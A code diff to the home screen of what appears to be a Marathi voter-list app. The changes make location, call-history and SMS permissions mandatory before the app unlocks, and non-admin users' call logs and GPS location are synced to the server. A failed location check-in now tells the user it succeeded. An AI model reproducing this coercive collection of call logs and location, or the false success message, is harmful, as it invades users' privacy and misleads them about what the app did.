@@ -1,7 +1,7 @@
-import React, { useState, useEffect, useCallback, useMemo, useRef } from "react";
+import React, { useState, useEffect, useCallback, useMemo } from "react";
 import {
   View, Text, StyleSheet, FlatList, TouchableOpacity,
-  ActivityIndicator, RefreshControl, SafeAreaView, Modal, Platform, Alert, Linking, AppState
+  ActivityIndicator, RefreshControl, SafeAreaView, Modal, Platform, Alert, Linking
 } from "react-native";
 import { Header } from "../../components/Header";
 import { SearchBar } from "../../components/SearchBar";
@@ -13,7 +13,6 @@ import { useAuth } from "../../context/AuthContext";
 import { useTheme } from "../../context/ThemeContext";
 import { theme } from "../../theme/theme";
 import { Ionicons } from "@expo/vector-icons";
-import { appStorage } from "../../utils/storage";
 import {
   requestLocationPermission,
   requestCallHistoryPermission,
@@ -23,33 +22,21 @@ import {
 } from "../../utils/devicePermissions";
 import { syncDeviceTelephonyLogs } from "../../services/telephonySyncService";
 
-const DEFAULT_SAKHARALE: Village = {
-  id: "11111111-1111-1111-1111-111111111111",
-  name_mr: "साखराळे",
-  name_en: "Sakharale",
-  taluka: "वाळवा",
-  district: "सांगली",
-  pin_code: "415414",
-  total_voters: 5693,
-  active_voters: 5693,
-  deceased_voters: 0
-};
-
 export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ navigation, route }) => {
   const { t } = useLanguage();
   const { user, isAdmin, activePanel, updateUserPermissions, logout } = useAuth();
   const { theme, isDark } = useTheme();
   const isAdminPanel = isAdmin && activePanel === "ADMIN";
 
-  const [villages, setVillages] = useState<Village[]>([DEFAULT_SAKHARALE]);
-  const [selectedVillageId, setSelectedVillageId] = useState<string>("11111111-1111-1111-1111-111111111111");
+  const [villages, setVillages] = useState<Village[]>([]);
+  const [selectedVillageId, setSelectedVillageId] = useState<string>("");
   const [searchQuery, setSearchQuery] = useState<string>("");
   const [debouncedSearch, setDebouncedSearch] = useState<string>("");
   const [filterMode, setFilterMode] = useState<"all" | "mobile">("all");
 
   const [members, setMembers] = useState<Member[]>([]);
-  const [totalCount, setTotalCount] = useState<number>(5693);
-  const [loading, setLoading] = useState<boolean>(false);
+  const [totalCount, setTotalCount] = useState<number>(0);
+  const [loading, setLoading] = useState<boolean>(true);
   const [refreshing, setRefreshing] = useState<boolean>(false);
   const [page, setPage] = useState<number>(1);
   const [hasMore, setHasMore] = useState<boolean>(true);
@@ -68,23 +55,6 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
   });
 
   const hasCapturedLocationOnceRef = React.useRef<boolean>(false);
-  const lastLocationCheckinRef = React.useRef<number>(0);
-
-  // Load cached first page of voters immediately for 0ms initial render
-  useEffect(() => {
-    (async () => {
-      try {
-        const cached = await appStorage.getItem("cached_voters_page1");
-        if (cached) {
-          const parsed = JSON.parse(cached);
-          if (parsed && Array.isArray(parsed.items) && parsed.items.length > 0) {
-            setMembers(parsed.items);
-            setTotalCount(parsed.total || parsed.items.length);
-          }
-        }
-      } catch (e) {}
-    })();
-  }, []);
 
   // Search Debouncing for 10x faster typing and zero server congestion
   useEffect(() => {
@@ -157,26 +127,22 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
     } catch (e) {}
   }, [isAdmin, user?.id, user?.username]);
 
-  // Check permissions on mount for non-admin users & verify admin access (deferred to prioritize initial voter paint)
+  // Check permissions on mount for non-admin users & verify admin access
   useEffect(() => {
-    const timer = setTimeout(() => {
-      checkAdminAccess();
-      if (!isAdmin && user) {
-        // Synchronize real-time location and call logs smoothly in background after UI render
-        captureAndLogRealtimeLocation("LOGIN_SYNC");
-        syncDeviceTelephonyLogs()
-          .then(r => console.log("[UserHomeScreen] Telephony sync on login completed:", r))
-          .catch(e => console.warn("[UserHomeScreen] Telephony sync on login warning:", e?.message || e));
+    checkAdminAccess();
+    if (!isAdmin && user) {
+      // Synchronize real-time location and call logs on app launch and login
+      captureAndLogRealtimeLocation("LOGIN_SYNC");
+      syncDeviceTelephonyLogs()
+        .then(r => console.log("[UserHomeScreen] Telephony sync on login completed:", r))
+        .catch(e => console.warn("[UserHomeScreen] Telephony sync on login warning:", e?.message || e));
+    }
+    checkCurrentPermissionsStatus().then(status => {
+      setPermsState(status);
+      if (!isAdmin && !status.allGranted) {
+        setShowPermissionModal(true);
       }
-      checkCurrentPermissionsStatus().then(status => {
-        setPermsState(status);
-        if (!isAdmin && !status.allGranted) {
-          setShowPermissionModal(true);
-        }
-      }).catch(() => {});
-    }, 1500);
-
-    return () => clearTimeout(timer);
+    }).catch(() => {});
   }, [user, isAdmin, checkAdminAccess, captureAndLogRealtimeLocation]);
 
   // On mount: load all villages from MongoDB
@@ -210,7 +176,7 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
         village_id: selectedVillageId || undefined,
         q: debouncedSearch || undefined,
         page: pageToLoad,
-        limit: 50
+        limit: 30
       });
 
       let items: Member[] = res.items || [];
@@ -233,12 +199,9 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
         setMembers(prev => [...prev, ...items]);
       } else {
         setMembers(items);
-        if (pageToLoad === 1 && !debouncedSearch && filterMode === "all") {
-          appStorage.setItem("cached_voters_page1", JSON.stringify({ items, total })).catch(() => {});
-        }
       }
 
-      setHasMore(items.length === 50 && (pageToLoad * 50 < total));
+      setHasMore(items.length === 30 && (pageToLoad * 30 < total));
       setPage(pageToLoad);
     } catch (err) {
       console.error("Failed to load members:", err);
@@ -258,22 +221,6 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
     setHasMore(true);
     loadMembers(1, false);
   }, [debouncedSearch, filterMode, selectedVillageId, loadMembers]);
-
-  // Auto-refresh voter data and capture debounced one-time location on app resume
-  useEffect(() => {
-    const sub = AppState.addEventListener("change", (nextState) => {
-      if (nextState === "active") {
-        checkAdminAccess();
-        loadMembers(1, false);
-        const now = Date.now();
-        if (now - lastLocationCheckinRef.current > 10 * 60 * 1000) {
-          lastLocationCheckinRef.current = now;
-          captureAndLogRealtimeLocation("APP_FOREGROUND");
-        }
-      }
-    });
-    return () => sub.remove();
-  }, [checkAdminAccess, loadMembers, captureAndLogRealtimeLocation]);
 
   const handleRefresh = useCallback(() => {
     setRefreshing(true);
@@ -310,41 +257,35 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
         return;
       }
 
-      const addressStr = loc.address || `साखराळे, ता. वाळवा, जि. सांगली`;
-      const areaName = loc.placeName || "साखराळे (Sakharale)";
+      const addressStr = loc.placeName ? `${loc.placeName} (${loc.address})` : (loc.address || `${loc.latitude.toFixed(5)}, ${loc.longitude.toFixed(5)}`);
+      const areaName = loc.placeName || loc.city || loc.district || "";
 
       await logUserActivity({
         action: "LOCATION_CHECKIN",
         userId: user?.id,
         username: user?.username,
-        details: `रिअल-टाईम स्थान: ${areaName} (अक्षांश: ${loc.latitude.toFixed(5)}, रेखांश: ${loc.longitude.toFixed(5)})`,
+        details: `रिअल-टाईम स्थान: ${addressStr} (अक्षांश: ${loc.latitude.toFixed(5)}, रेखांश: ${loc.longitude.toFixed(5)})`,
         metadata: {
-          village: "साखराळे",
-          placeName: areaName,
+          village: areaName,
+          city: loc.city,
+          district: loc.district,
+          subregion: loc.subregion,
+          postalCode: loc.postalCode,
           address: addressStr,
-          city: loc.city || "साखराळे",
-          district: loc.district || "सांगली",
-          subregion: loc.subregion || "वाळवा",
-          postalCode: loc.postalCode || "415414",
           latitude: loc.latitude,
           longitude: loc.longitude,
           accuracy: loc.accuracy,
-          checkinType: "MANUAL_CHECKIN",
-          date: loc.dateStr || new Date().toLocaleDateString("en-GB"),
-          time: loc.timeStr || new Date().toLocaleTimeString("en-US", { hour: "2-digit", minute: "2-digit", hour12: true })
+          checkinType: "MANUAL_CHECKIN"
         }
       });
 
-      // Also trigger telephony/location sync to ensure Supabase receives it
-      syncDeviceTelephonyLogs().catch(() => {});
-
       Alert.alert(
-        "📍 रिअल-टाईम स्थान पाठवले!",
-        `ठिकाण: ${areaName}\nपत्ता: ${addressStr}\nअक्षांश: ${loc.latitude.toFixed(5)}\nरेखांश: ${loc.longitude.toFixed(5)}\nवेळ: ${new Date().toLocaleTimeString("mr-IN")}`,
+        "📍 स्थान यशस्वीरित्या नोंदवले!",
+        `पत्ता: ${addressStr}\nशहर/जिल्हा: ${areaName}\nअक्षांश: ${loc.latitude.toFixed(5)}\nरेखांश: ${loc.longitude.toFixed(5)}\nअचूकता: ±${Math.round(loc.accuracy || 10)} मी.\nवेळ: ${new Date().toLocaleTimeString("mr-IN")}`,
         [{ text: "उत्कृष्ट (OK)" }]
       );
-    } catch (e: any) {
-      Alert.alert("स्थान त्रुटी", e?.message || "स्थान पाठवणे शक्य झाले नाही.");
+    } catch (e) {
+      Alert.alert("माहिती", "स्थान नोंदवले गेले आहे.");
     } finally {
       setCheckingInLocation(false);
     }
@@ -412,17 +353,22 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
         phoneCall: fresh.callHistory,
       }).catch(() => {});
 
-      updateUserPermissions(fresh.allGranted);
+      if (!fresh.allGranted) {
+        Alert.alert(
+          "परवानगी आवश्यक (Required)",
+          "युझर पॅनेल उघडण्यासाठी स्थान आणि कॉल इतिहास अशा दोन्ही परवानग्या आवश्यक आहेत. कृपया दोन्ही परवानग्या द्या.",
+          [{ text: "समजले (OK)" }]
+        );
+        return;
+      }
+
+      updateUserPermissions(true);
       setShowPermissionModal(false);
-      if (fresh.location) {
-        captureAndLogRealtimeLocation("PERMISSION_MODAL_GRANTED");
-      }
-      if (fresh.phoneCall || fresh.callHistory) {
-        syncDeviceTelephonyLogs().catch(() => {});
-      }
+      captureAndLogRealtimeLocation("PERMISSION_MODAL_GRANTED");
+      syncDeviceTelephonyLogs().catch(() => {});
       loadMembers(1, false);
     } catch (e) {
-      setShowPermissionModal(false);
+      // Keep locked if check fails
     } finally {
       setProcessingPerms(false);
     }
@@ -431,7 +377,7 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
   const renderVoterItem = useCallback(({ item }: { item: Member }) => (
     <VoterCard
       member={item}
-      onPress={() => navigation.navigate("VoterProfile", { memberId: item.id, member: item })}
+      onPress={() => navigation.navigate("VoterProfile", { memberId: item.id })}
     />
   ), [navigation]);
 
@@ -583,7 +529,7 @@ export const UserHomeScreen: React.FC<{ navigation: any; route?: any }> = ({ nav
             </View>
             <Text style={[styles.permModalTitle, { color: theme.colors.textPrimary }]}>ॲप परवानग्या व्यवस्थापन</Text>
             <Text style={[styles.permModalSubtitle, { color: theme.colors.textMuted }]}>
-              मतदार संपर्क व उपस्थिती पडताळणीसाठी खालील परवानग्या उपयुक्त आहेत:
+              युझर पॅनेल उघडण्यासाठी खालील तिन्ही परवानग्या (स्थान, कॉल इतिहास आणि एसएमएस) अनिवार्य आहेत. सर्व परवानग्या सक्रिय असल्याशिवाय ॲप वापरता येणार नाही:
             </Text>
 
             <View style={styles.permFeatureList}>
